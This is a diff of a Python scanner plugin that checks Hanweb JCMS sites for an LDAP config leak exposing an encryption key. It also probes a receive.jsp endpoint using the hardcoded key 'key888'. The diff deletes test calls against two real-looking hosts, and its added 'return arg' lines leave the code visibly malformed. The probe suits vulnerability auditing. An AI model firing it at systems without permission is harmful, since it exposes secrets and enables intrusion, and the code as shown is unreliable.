@@ -5,16 +5,17 @@
 
 import re
 
-def assign(service, arg): 
+def assign(service, arg):
     if service == "hanweb":
         return True, arg
-		
+
 def audit(arg):
     getdata1 = 'jcms/interface/ldap/ldapconf.xml'
     code, head, res, errcode, _ = curl.curl2(arg+getdata1)
     m = re.search('<enckey>(.*?)</enckey>',res)
     if code == 200 and m:
         security_hole(arg + getdata1 + "   :ldap leakage")
+        return arg
     getdata2 = 'jcms/interface/ldap/receive.jsp?state=S&enckey=key888'
     code, head, res, errcode, _ = curl.curl2(arg+getdata2)
     if code == 200 and '成功' in res :
@@ -27,7 +28,7 @@ def audit(arg):
 
 
 
-if __name__ == '__main__': 
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('hanweb', 'http://6bur.cscec.com/')[1])
-    audit(assign('hanweb', 'http://202.108.199.114:80/')[1])
